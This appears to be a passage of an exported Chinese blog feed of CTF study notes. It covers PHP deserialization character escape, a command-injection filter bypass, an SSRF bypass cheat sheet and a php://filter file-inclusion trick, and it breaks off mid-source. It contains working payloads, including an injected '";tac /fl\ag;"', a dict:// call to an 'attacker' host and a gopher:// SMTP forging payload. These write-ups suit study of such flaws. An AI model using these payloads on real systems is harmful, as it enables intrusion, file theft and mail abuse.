title="客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）"></a>客户端通过控制该参数会对服务端造成什么影响，继而使得客户端本身收到影响，从而造成了什么漏洞？如果是xss漏洞，具体又是什么类型的xss漏洞，为什么？（3分）</h3><p>会造成xxs漏洞，这个会造成反射型xxs漏洞，甚至可以获取到cookie值。<br>因为网页对用户输入提交给web server的内容不做出严格限制和过滤，那么就可以向web页面里插入如恶意js代码，当用户浏览该页之时，嵌入其中Web里面的JS代码会被执行，从而达到恶意的特殊目的。  </p><h3 id="4-思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）"><a href="#4-思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）" class="headerlink" title="4.思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）"></a>4.思考：现实中如何利用xss漏洞实施攻击，我们应该如何预防？（1分）</h3><p>对提交的内容做出过滤，防止向web页面插入恶意代码。那么利用漏洞同理。</p>]]></content>
      
      
      <categories>
          
          <category> note8 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反序列化的字符逃逸</title>
      <link href="test66/undefined-undefined.html"/>
      <url>test66/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天学习一个关于php序列化的新知识点——字符逃逸。  </p><h1 id="安洵杯-2019-easy-serialize-php"><a href="#安洵杯-2019-easy-serialize-php" class="headerlink" title="[安洵杯 2019]easy_serialize_php"></a>[安洵杯 2019]easy_serialize_php</h1><p>打开题目，发现直接给出了源码：  </p><pre><code>&lt;?php$function = @$_GET[&#39;f&#39;];function filter($img)&#123;$filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);$filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;return preg_replace($filter,&#39;&#39;,$img);&#125;if($_SESSION)&#123;unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);if(!$function)&#123;echo &#39;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#39;;&#125;if(!$_GET[&#39;img_path&#39;])&#123;$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;$_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;)&#123;highlight_file(&#39;index.php&#39;);&#125;else if($function == &#39;phpinfo&#39;)&#123;eval(&#39;phpinfo();&#39;); //maybe you can find something in here!&#125;else if($function == &#39;show_image&#39;)&#123;$userinfo = unserialize($serialize_info);echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125;   </code></pre><p>题目就可以看出来这道题是有关php序列化和反序列化的，那么我们第一步就是先审计代码：  </p><p>首先我们传入的变量$f会把值赋给变量$function，然后定义了一个filter()函数这个函数会接收一个名为$img变量，然后会对这个变量进行正则匹配，如果变量中有名单中的字符就会把他替换成空字符。  </p><pre><code>function filter($img)&#123;$filter_arr = array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);$filter = &#39;/&#39;.implode(&#39;|&#39;,$filter_arr).&#39;/i&#39;;return preg_replace($filter,&#39;&#39;,$img);&#125;  </code></pre><p>接着我们可以看到它把$_SESSION这个数组先给初始化后再给它赋值，其中数组中的user=’guest’,function=$function。  </p><pre><code>if($_SESSION)&#123;unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#39;guest&#39;;$_SESSION[&#39;function&#39;] = $function;extract($_POST);  </code></pre><p>但是我们可以看到再这段代码的结尾有一个extract()函数，这个函数就是第一个重点，我们之前已经知道了foreach()函数可以造成变量覆盖，现在我们有可以补充这个extract()函数了。    </p><hr><p>关于extract()函数有以下定义和用法：  </p><pre><code>extract() 函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。该函数返回成功导入到符号表中的变量数目。</code></pre><p>也就是说如果我们没有设置第二个参数来应对同名元素的冲突时，那么我们新创建的变量将会覆盖原有变量。这里举一个小例子：  </p><pre><code>&lt;?php$a = &quot;Original&quot;;$my_array = array(&quot;a&quot; =&gt; &quot;Cat&quot;,&quot;b&quot; =&gt; &quot;Dog&quot;, &quot;c&quot; =&gt; &quot;Horse&quot;);extract($my_array);echo &quot;\$a = $a; \$b = $b; \$c = $c&quot;;?&gt;  输出结果：$a = Cat; $b = Dog; $c = Horse。  </code></pre><p>我们可以发现原先的$a确实被覆盖了。  </p><hr><p>那么回到题目，因为extract()函数中的变量是我们post上传的值，所以说我们可以利用post上传变量来覆盖代码中已经被赋值过的变量。  </p><p>那么我们接着往下看：  </p><pre><code>if(!$_GET[&#39;img_path&#39;])&#123;$_SESSION[&#39;img&#39;] = base64_encode(&#39;guest_img.png&#39;);&#125;else&#123;$_SESSION[&#39;img&#39;] = sha1(base64_encode($_GET[&#39;img_path&#39;]));&#125;  </code></pre><p>这个是对于是否上传img_path变量的应对，并给数组$_SESSION中的img元素赋值，也就是说无论我们是否上传这个变量，session数组中的img元素都要被赋值。  </p><p>最后一段就是重头戏了，也是这道题目反序列化的重点。  </p><pre><code>$serialize_info = filter(serialize($_SESSION));if($function == &#39;highlight_file&#39;)&#123;highlight_file(&#39;index.php&#39;);&#125;else if($function == &#39;phpinfo&#39;)&#123;eval(&#39;phpinfo();&#39;); //maybe you can find something in here!&#125;else if($function == &#39;show_image&#39;)&#123;$userinfo = unserialize($serialize_info);echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));&#125;  </code></pre><p>可以看到，先定义了一个变量$serialize_info，它的值是先对$ _session这个数组进行序列化后再经过filter()函数进行过滤后的值。  </p><p>然后是对于$function变量的值的判断，当它为’highlight_file’时，显示index.php，也就是现在的页面。  </p><p>当值为phpinfo时，会显示执行phpinfo()，并且它提示了这里有我们想要的东西。  </p><p>当值为show_image时，他会将序列化的$serialize _info值再反序列化，并且将值赋给新的变量$userinfo,这样就形成了一个新的数组，随后再执行file _get _contents()文件读写函数，读取的文件是经过base64解码后的数组$userinfo中的img元素的值。   </p><p>好了，到这里我们就可以理出一个大致思路了，我们能利用的函数现在有extract()函数和file _get _contents()函数，前者我们用它进行变量覆盖，来控制一些变量，后者我们用它来读取flag文件。  </p><p>首先我们先看一下先前代码中给我们的提示。   </p><pre><code>?f=phpinfo   </code></pre><p><a href="https://img.imgdb.cn/item/607ba7b98322e6675c5e49a1.png"><img src="https://img.imgdb.cn/item/607ba7b98322e6675c5e49a1.png"></a>  </p><p>可以看到在页面的基本php信息中它说该页面包含了一个d0g3_f1ag.php文件，那么我们要读取的文件应该就是这个文件了。   </p><p>从之前的分析中我们已经知道我们要利用$function == ‘show_image’时执行的文件读取函数来读取文件名img元素的值的文件。那么我们就要使$userinfo[‘img’]=’d0g3 _f1ag.php’。再往前推就是使$ _SESSION[‘img’]=’d0g3 _f1ag.php’,但是前面我们已经知道了$ _SESSION[‘img’]的值是被固定了的，没有办法通过我们的extract()函数进行覆盖。也就是说没有办法直接post  </p><pre><code>  $ _SESSION[&#39;img&#39;]=&#39;d0g3_f1ag.php&#39;</code></pre><p>到了这里就成了如何让这个数组里的img元素的值变成我们想要的值的问题，这里就牵扯到了反序列化中的字符逃逸。   </p><h2 id="字符逃逸"><a href="#字符逃逸" class="headerlink" title="字符逃逸"></a>字符逃逸</h2><p>先举个例子  </p><pre><code>&lt;?php$str=&#39;a:2:&#123;i:0;s:8:&quot;Hed9eh0g&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;&#39;;var_dump(unserialize($str));输出array(2) &#123; [0]=&gt; string(8) &quot;Hed9eh0g&quot; [1]=&gt; string(5) &quot;aaaaa&quot; &#125;  &lt;?php$str=&#39;a:2:&#123;i:0;s:8:&quot;Hed9eh0g&quot;;i:1;s:5:&quot;aaaaa&quot;;&#125;abc&#39;;var_dump(unserialize($str));输出array(2) &#123; [0]=&gt; string(8) &quot;Hed9eh0g&quot; [1]=&gt; string(5) &quot;aaaaa&quot; &#125;</code></pre><p>可以看出来php反序列化识别是有一定范围的，范围之外的字符并不影响反序列化。这就是字符逃逸。我们构造一些特殊的变量值就可以达到舍去一部分变量。   </p><p>因为我们不能对img元素进行直接的修改，但是我们可以对user和function元素进行变量覆盖，那么如果我们这样构造：  </p><pre><code>&lt;?php$_SESSION[&quot;user&quot;]=&#39;flagflagflagflagflagflag&#39;；$_SESSION[&quot;function&quot;]=&#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&#39;; //ZDBnM19mMWFnLnBocA==是d0g3_f1ag.php的base64编码$_SESSION[&quot;img&quot;]=&#39;L2QwZzNfZmxsbGxsbGFn&#39;;echo serialize($_SESSION);输出a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125;   </code></pre><p>可以看到我们给数组中元素function的赋值很特殊，其结尾为;}并且我们在function元素中又添加了<strong>我们自定义的img元素的序列化后的字符串</strong>，当对session数组进行序列化后，我们发现花括号的闭合在元素function序列化后就已经闭合了所以说这里真正在接下来反序列化中起到作用的只到元素function结束。  </p><pre><code>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;  </code></pre><p>这样就把原本固定的img元素的序列化给舍去了转而成为了我们想要的img的序列化。但是如果就这样反序列化的话结果却不是我们想要的。  </p><pre><code>array(3) &#123; [&quot;user&quot;]=&gt; string(24) &quot;flagflagflagflagflagflag&quot;[function]=&gt; string(59) &quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;  </code></pre><p>img并没有被成功反序列化。但是我们已经知道了这个序列化的字符串是要经过filter()函数过滤的，而flag字符会被替换为空，所以说真正的序列化字符串是这样的：  </p><pre><code>&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;  </code></pre><p>因为是s:24:后面为空，那么在反序列化时会往后推24个字符,那么也就是读取**;s:8:”function”;s:59:”a”<strong>正好以分号</strong>；**结尾，符合反序列化规则，而后面的s:3:”img”;s:20:”ZDBnM19mMWFnLnBocA==”;本来就是按照我们的想法来序列化的，自然也就满足了反序列化的规则，所以最后得到的反序列化结果为：  </p><pre><code>array(3) &#123; [&quot;user&quot;]=&gt; string(24) &quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot; [&quot;img&quot;]=&gt; string(20) &quot;ZDBnM19mMWFnLnBocA==&quot; [&quot;dd&quot;]=&gt; string(1) &quot;a&quot; &#125;    </code></pre><p>和之前一样是三个元素，但是img元素的值已经彻底改变了。实现了字符逃逸。  </p><p>那么接下来我们就按这个思路来post我们的参数就行了:  </p><pre><code>GET:?f=show_image //使界面执行读写函数。POST:_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;  //对之前已经被定义的user元素和function元素进行变量覆盖。  </code></pre><p>f12发现flag在/d0g3_fllllllag里  </p><p><a href="https://img.imgdb.cn/item/607bc0088322e6675c8dc94b.png"><img src="https://img.imgdb.cn/item/607bc0088322e6675c8dc94b.png"></a>  </p><p>那么我们把ZDBnM19mMWFnLnBocA==改为/d0g3_fllllllag的base64编码就行了，<strong>注意改变后的base64编码长度要和之前的一样</strong>  </p><pre><code>ZDBnM19mMWFnLnBocA==改为L2QwZzNfZmxsbGxsbGFn（这里就不能加==了）  </code></pre><p>这样就得到flag。  </p><p><a href="https://img.imgdb.cn/item/607bc1b28322e6675c9124ae.png"><img src="https://img.imgdb.cn/item/607bc1b28322e6675c9124ae.png"></a>  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>php反序列化的字符逃逸是一个新的知识点，这样的题目都有一些共同的特点： <strong>先 serialize()，然后 过滤（变多or变少），然后 unserialize() 。从而实现逃逸</strong>。对于这种题目，要思考的关键使如何构造变量使其在序列化和过滤后不仅能实现闭合满足反序列化要求并且成功构造出我们想要一个新的变量，从而实现逃逸。  </p><p>这里涉及到对字符长度变化的运算以及对于变量的巧妙构造，感觉要考一些数学的运算。。。。  </p><p>总的来说这样的题原理不难理解，但是难于构造，以后遇到还是要多练习，多熟悉php的序列化和反序列化。  </p><p>下面附上相关学习博客：  </p><p><a href="https://blog.csdn.net/Zero_Adam/article/details/113534102?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161871355416780269851464%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161871355416780269851464&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-113534102.first_rank_v2_pc_rank_v29&utm_term=php%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8&spm=1018.2226.3001.4449">PHP反序列化之字符逃逸入门笔记</a></p>]]></content>
      
      
      <categories>
          
          <category> test66 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习17</title>
      <link href="test65/undefined-undefined.html"/>
      <url>test65/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这道题是buu新上的一题，难度还是比较低的，考察的是绕过，记录一下。  </p><h1 id="EasyBypass"><a href="#EasyBypass" class="headerlink" title="EasyBypass"></a>EasyBypass</h1><p>打开题目，可以看到源码  </p><pre><code>&lt;?phphighlight_file(__FILE__);$comm1 = $_GET[&#39;comm1&#39;];$comm2 = $_GET[&#39;comm2&#39;];if(preg_match(&quot;/\&#39;|\`|\\|\*|\n|\t|\xA0|\r|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||tail|bin|less|more|string|nl|pwd|cat|sh|flag|find|ls|grep|echo|w/is&quot;, $comm1))$comm1 = &quot;&quot;;if(preg_match(&quot;/\&#39;|\&quot;|;|,|\`|\*|\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|&lt;|\&amp;[^\d]|@|\||ls|\||tail|more|cat|string|bin|less||tac|sh|flag|find|grep|echo|w/is&quot;, $comm2))$comm2 = &quot;&quot;;$flag = &quot;#flag in /flag&quot;;$comm1 = &#39;&quot;&#39; . $comm1 . &#39;&quot;&#39;;$comm2 = &#39;&quot;&#39; . $comm2 . &#39;&quot;&#39;;$cmd = &quot;file $comm1 $comm2&quot;;system($cmd);?&gt;cannot open `&#39; (No such file or directory) cannot open `&#39; (No such file or directory)   </code></pre><p>代码最后的system($cmd)已经明摆着告诉我们要使用命令语句，而这个$cmd是由字符串”file”和变量comm1和comm2拼接起来的。  </p><pre><code>$cmd = &quot;file $comm1 $comm2&quot;;  </code></pre><p>而这两个变量通过get方式上传，所以这道题的思路就是如何绕过对这两个变量的过滤来上传命令语句得到flag，题目已经给出提示说flag在/flag中，所以我们要构造的命令应该是：   </p><pre><code>cat /flag  </code></pre><p>但是这里有一个坑，一开始我的想法其实就是给comm1=cat，comm2=/flag，让他们两个拼接从而构成完整的命令。但是试了一会发现第二个变量被过滤的太严了，反而第一个变量比较宽松，于是就直接把命令放在第一个变量中上传。（有可能是我太菜了，没发现别的绕过方法）  </p><p>那么接下来我们就只对第一个变量进行绕过。  </p><p>一眼就能看到的是对于comm1虽然过滤了cat但是却没有过滤tac来读取文件。所以对于cat的绕过很简单。  </p><p>对于flag字符不知道是不是非预期，它的正则并没有过滤掉转义符\，正则里关于对\的过滤是这样的：    </p><pre><code>if(preg_match(&quot;/\&#39;|\`|\\|/&quot;）  这里的|\\|其实并没有过滤掉\字符这是因为当两个\在一起时相当于一个普通的\符号，而不是转义符，所以最后给正则函数传递的结果是这样的  if(preg_match(&quot;/\&#39;|\`|\|/&quot;)这样是没有办法起到过滤转义符\的效果的。  应该改为if(preg_match(&quot;/\&#39;|\`|\\\|/&quot;）这样就能成功过滤转义符\。  </code></pre><p>总而言之，我们可以这样构造：  </p><pre><code>?comm1=tac /fl\ag  </code></pre><p>但是传上去后发现并没有这么简单。  </p><p><a href="https://img.imgdb.cn/item/60793b718322e6675ceb819d.png"><img src="https://img.imgdb.cn/item/60793b718322e6675ceb819d.png"></a>  </p><p>发现我们上传的字符并没有被过滤，但是却出现报错，再回头看一下代码，发现问题出现在这个**”file”**字符上，我们实际上传入的是这样的：  </p><pre><code>system(file&quot;$comm1&quot;&quot;$comm2&quot;)很明显我们的$comm1被当作要查找的字符串了，因为第一次见到system()函数里有file参数出现，我的理解是system()中有file参数，表示读取文件名为&quot;$comm1&quot;文件。  </code></pre><p>所以说这里的引号使我们上传的comm1变成了要打开的文件的文件名。如果要想执行命令comm1，我们需要将前后的两个引号闭合才行。  </p><p>我们可以看到对于comm1并没有过滤分号；（这也是为什么只选择第一个变量来执行命令的原因）那么我们就可以这样构造payload。  </p><pre><code>?comm1=&quot;;tac /fl\ag;&quot;  </code></pre><p>这样我们最终上传的就是  </p><pre><code>system(file&quot; &quot;;tac /fl\ag;&quot; &quot;)  </code></pre><p>新添的两个引号与原来的引号结合，相当于空，而分号可以连续执行命令，这样我们就可以成功执行tac /fl\ag命令，拿到flag。  </p><h3 id="另一种绕过"><a href="#另一种绕过" class="headerlink" title="另一种绕过"></a>另一种绕过</h3><p>除了非预期，其实我们还可以使用linux的通配符进行绕过。  </p><p>linux通配符除了*还有？它们二者各有用途。其中？表示任意字符。如果我们这样构造</p><pre><code>comm1=&quot;;tac /fl??;&quot;</code></pre><p>那么就表示读取前两个字母为fl，后两个为任意字符的文件。这样也可以绕过正则。  </p><p><a href="https://img.imgdb.cn/item/607949338322e6675c08775c.png"><img src="https://img.imgdb.cn/item/607949338322e6675c08775c.png"></a>  </p><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题主要考的还是rce的绕过正则匹配，绕过的题目需要多积累才行，而关于闭合双引号这一点确实需要细心，我一开始就只关注了命令的绕过而忽视了双引号，导致虽然构造出来了命令但无法成功执行。  </p><p>附上相关绕过笔记博客  </p><p><a href="https://blog.csdn.net/weixin_44431280/article/details/98738469?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161849797116780366582583%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161849797116780366582583&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-5-98738469.first_rank_v2_pc_rank_v29&utm_term=linux%E9%80%9A%E9%85%8D%E7%AC%A6%EF%BC%9F">linux—通配符详解及总结</a><br><a href="https://blog.csdn.net/m0_49503725/article/details/112156807?ops_request_misc=&request_id=&biz_id=102&utm_term=%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-4-112156807.first_rank_v2_pc_rank_v29">命令执行绕过方式总结</a><br><a href="https://blog.csdn.net/loseheart157/article/details/109305380?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161846948616780274173706%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161846948616780274173706&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~times_rank-5-109305380.first_rank_v2_pc_rank_v29&utm_term=%E6%9E%84%E9%80%A0%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87">RCE漏洞之绕过</a></p>]]></content>
      
      
      <categories>
          
          <category> test65 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf绕过总结</title>
      <link href="note7/undefined-undefined.html"/>
      <url>note7/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天群里发了一个关于ssrf绕过总结的文章，想起来做过的ssrf题目也有不少，这次做一个绕过的总结。这里只总结目前还没有见过的绕过方式。  </p><h2 id="攻击本地"><a href="#攻击本地" class="headerlink" title="攻击本地"></a>攻击本地</h2><pre><code>http://127.0.0.1:80http://localhost:22</code></pre><p>1、利用[::]</p><pre><code>利用[::]绕过localhosthttp://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</code></pre><p>2、利用@  </p><pre><code>http://example.com@127.0.0.1  </code></pre><p>3、利用短地址</p><pre><code>http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1  </code></pre><p>4、利用上传</p><pre><code>也不一定是上传，我也说不清，自己体会 -.-修改&quot;type=file&quot;为&quot;type=url&quot;比如：上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF  </code></pre><p>5、利用Enclosed alphanumerics</p><pre><code>利用Enclosed alphanumericsⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.comList:① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿  这个确实是少见了。和之前那个unicode编码有相似之处。  </code></pre><p>6、利用句号</p><pre><code>127。0。0。1  &gt;&gt;&gt;  127.0.0.1  这个算是和上面那个差不多的。  </code></pre><p>7、利用特殊地址</p><pre><code>http://0/  </code></pre><p>8、利用协议</p><pre><code>Dict://dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;ssrf.php?url=dict://attacker:11111/SFTP://ssrf.php?url=sftp://example.com:11111/TFTP://ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher://ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a  </code></pre><p>9、使用组合</p><pre><code>各种绕过进行自由组合即可   </code></pre><p>其实绕过方式多种多样，遇到没见过的就多积累，这样才能面对一道题有多种方法。</p>]]></content>
      
      
      <categories>
          
          <category> note7 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>日常练习16</title>
      <link href="test64/undefined-undefined.html"/>
      <url>test64/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天做题知道了一个关于php伪协议的一个小知识点，记录下来。  </p><h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><p>打开题目，发现是一个选择页面，有两个选项，如果选择woofers会出现狗的照片，选择meowers就会出现猫的图片，但是我们可以发现当选择其中一个选项后url会发生变化。   </p><p><a href="https://img.imgdb.cn/item/607ac1db8322e6675cdc0496.png"><img src="https://img.imgdb.cn/item/607ac1db8322e6675cdc0496.png"></a>  </p><p>此时的url为：  </p><pre><code>http://1b3467ab-92b7-481e-8f37-18bbc1f7e16b.node3.buuoj.cn/index.php?category=woofers  </code></pre><p>可以看到，这里是用get方式上传了category变量，当这个变量为woofers时显示狗的照片，为meowers时显示猫的照片。  </p><p>根据这个发现，我们可以想到ssrf攻击（有关ssrf攻击可以看我之前的博客。）而ssrf攻击时可以通过file://来读取文件的。  </p><p>那我们这样构造payload。  </p><pre><code>?category=file://../../flag  </code></pre><p><a href="https://img.imgdb.cn/item/607ac34a8322e6675cdf99b9.png"><img src="https://img.imgdb.cn/item/607ac34a8322e6675cdf99b9.png"></a>  </p><p>发现flag应该是被过滤了。  </p><p>那么我们查看网页源代码。   </p><pre><code>?category=file://../../index  </code></pre><p><a href="https://img.imgdb.cn/item/607ac3ad8322e6675ce0830a.png"><img src="https://img.imgdb.cn/item/607ac3ad8322e6675ce0830a.png"></a>  </p><p>这里发现报错了。是一个include()函数的报错，从这里我们可以知道这道题是一个include()函数漏洞，我们上传的category的参数会传入include()函数中。   </p><p>那么我们就可以使用伪协议来利用include()漏洞。   </p><p>我们这样构造：  </p><pre><code>?category=php://filter/read=convert.base64-encode/resource=index  </code></pre><p>注意这里文件名是index而不是index.php，这是因为代码中会给你添加上后缀名（如果上传index.php，报错时会显示index.php.php，说明代码中已经加上了文件后缀。  </p><p>这样我们就能得到源码，解码后如下：  </p><pre><code>&lt;html&gt;&lt;head&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;&lt;meta name=&quot;description&quot; content=&quot;Images that spark joy&quot;&gt;&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0, minimum-scale=1.0&quot;&gt;&lt;title&gt;Had a bad day?&lt;/title&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;css/material.min.css&quot;&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;css/style.css&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;div class=&quot;page-layout mdl-layout mdl-layout--fixed-header mdl-js-layout mdl-color--grey-100&quot;&gt;  &lt;header class=&quot;page-header mdl-layout__header mdl-layout__header--scroll mdl-color--grey-100 mdl-color-text--grey-800&quot;&gt;    &lt;div class=&quot;mdl-layout__header-row&quot;&gt;      &lt;span class=&quot;mdl-layout-title&quot;&gt;Had a bad day?&lt;/span&gt;      &lt;div class=&quot;mdl-layout-spacer&quot;&gt;&lt;/div&gt;    &lt;div&gt;  &lt;/header&gt;  &lt;div class=&quot;page-ribbon&quot;&gt;&lt;/div&gt;  &lt;main class=&quot;page-main mdl-layout__content&quot;&gt;    &lt;div class=&quot;page-container mdl-grid&quot;&gt;      &lt;div class=&quot;mdl-cell mdl-cell--2-col mdl-cell--hide-tablet mdl-cell--hide-phone&quot;&gt;&lt;/div&gt;      &lt;div class=&quot;page-content mdl-color--white mdl-shadow--4dp content mdl-color-text--grey-800 mdl-cell mdl-cell--8-col&quot;&gt;        &lt;div class=&quot;page-crumbs mdl-color-text--grey-500&quot;&gt;        &lt;/div&gt;        &lt;h3&gt;Cheer up!&lt;/h3&gt;          &lt;p&gt;            Did you have a bad day? Did things not go your way today? Are you feeling down? Pick an option and let the adorable images cheer you up!          &lt;/p&gt;          &lt;div class=&quot;page-include&quot;&gt;          &lt;?php            $file = $_GET[&#39;category&#39;];            if(isset($file))            &#123;                if( strpos( $file, &quot;woofers&quot; ) !==  false || strpos( $file, &quot;meowers&quot; ) !==  false || strpos( $file, &quot;index&quot;))&#123;                    include ($file . &#39;.php&#39;);                &#125;                else&#123;                    echo &quot;Sorry, we currently only support woofers and meowers.&quot;;                &#125;            &#125;            ?&gt;        &lt;/div&gt;      